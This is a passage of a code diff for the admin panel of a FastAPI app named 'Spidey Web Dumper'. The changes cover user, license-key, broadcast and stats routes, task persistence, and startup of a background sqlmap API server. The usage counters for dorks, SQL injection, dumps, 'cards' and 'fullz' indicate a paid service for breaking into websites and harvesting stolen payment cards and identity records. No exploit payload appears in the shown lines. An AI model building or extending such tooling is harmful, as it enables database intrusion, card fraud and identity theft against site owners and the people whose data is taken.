-                                        "users": items, "msg": msg})
+    return render("admin_users.html", {"request": request, "uid": uid, "users": items, "msg": msg})
 
 @app.post(ADMIN_PATH + "/users/delete")
 async def admin_users_delete(request: Request, username: str = Form(...)):
@@ -1313,8 +1384,7 @@ async def admin_users_extend(request: Request, username: str = Form(...), plan: 
     return RedirectResponse(f"{ADMIN_PATH}/users?msg=Extended", status_code=302)
 
 @app.post(ADMIN_PATH + "/users/reset_password")
-async def admin_users_reset(request: Request, username: str = Form(...),
-                             new_password: str = Form(...)):
+async def admin_users_reset(request: Request, username: str = Form(...), new_password: str = Form(...)):
     uid = require_admin(request)
     users = load_users()
     if username not in users:
@@ -1332,8 +1402,7 @@ async def admin_users_clear_usage(request: Request, username: str = Form(...)):
     users = load_users()
     if username not in users:
         return RedirectResponse(f"{ADMIN_PATH}/users?msg=Not+found", status_code=302)
-    users[username]["usage"] = {"keywords": 0, "dorks": 0, "urls": 0,
-                                  "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0}
+    users[username]["usage"] = {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0}
     save_users(users)
     return RedirectResponse(f"{ADMIN_PATH}/users?msg=Usage+cleared", status_code=302)
 
@@ -1341,16 +1410,13 @@ async def admin_users_clear_usage(request: Request, username: str = Form(...)):
 async def admin_broadcast_page(request: Request, msg: str = None):
     uid = require_admin(request)
     users = load_users()
-    return render("admin_broadcast.html", {"request": request, "uid": uid,
-                                            "total_users": len(users), "msg": msg})
+    return render("admin_broadcast.html", {"request": request, "uid": uid, "total_users": len(users), "msg": msg})
 
 @app.post(ADMIN_PATH + "/broadcast/send")
-async def admin_broadcast_send(request: Request, subject: str = Form(...),
-                                message: str = Form(...)):
+async def admin_broadcast_send(request: Request, subject: str = Form(...), message: str = Form(...)):
     uid = require_admin(request)
     bcast_file = os.path.join(DATA_DIR, "broadcast.json")
-    _save_json(bcast_file, {"subject": subject, "message": message,
-                            "sent_at": datetime.now().isoformat(), "sent_by": uid})
+    _save_json(bcast_file, {"subject": subject, "message": message, "sent_at": datetime.now().isoformat(), "sent_by": uid})
     return RedirectResponse(f"{ADMIN_PATH}/broadcast?msg=Broadcast+sent", status_code=302)
 
 @app.get(ADMIN_PATH + "/stats", response_class=HTMLResponse)
@@ -1368,8 +1434,7 @@ async def admin_stats(request: Request):
     import platform
     stats = {
         "total_users": len(users),
-        "active_users": sum(1 for u in users.values()
-                            if u.get("expires") and u.get("expires") > datetime.now().isoformat()),
+        "active_users": sum(1 for u in users.values() if u.get("expires") and u.get("expires") > datetime.now().isoformat()),
         "total_keys": len(keys),
         "used_keys": sum(1 for k in keys.values() if k.get("used_by")),
         "free_keys": sum(1 for k in keys.values() if not k.get("used_by")),
@@ -1392,16 +1457,17 @@ async def on_startup():
     logger.info(f"🛡️  Admin path: {ADMIN_PATH}")
     load_users()
     load_keys()
+    load_tasks_from_disk()
     try:
         from core.sqlmap_api import ensure_api_server
         asyncio.create_task(ensure_api_server())
-        logger.info("🔧 sqlmapapi starting in background...")
+        logger.info("🔧 sqlmapapi starting...")
     except Exception as e:
         logger.warning(f"sqlmapapi start failed: {e}")
     async def _cleaner():
         while True:
             await asyncio.sleep(600)
-            try: cleanup_old_tasks(max_age_hours=6)
+            try: cleanup_old_tasks(max_age_hours=24)
             except Exception: pass
     asyncio.create_task(_cleaner())
     logger.info("✅ Spidey Web Dumper ready")
@@ -1409,6 +1475,10 @@ async def on_startup():
 @app.on_event("shutdown")
 async def on_shutdown():
     logger.info("🕷️  Spidey shutting down...")
+    try:
+        save_tasks_to_disk()
+    except Exception:
+        pass
     try:
         from core.sqlmap_api import stop_api_server
         stop_api_server()
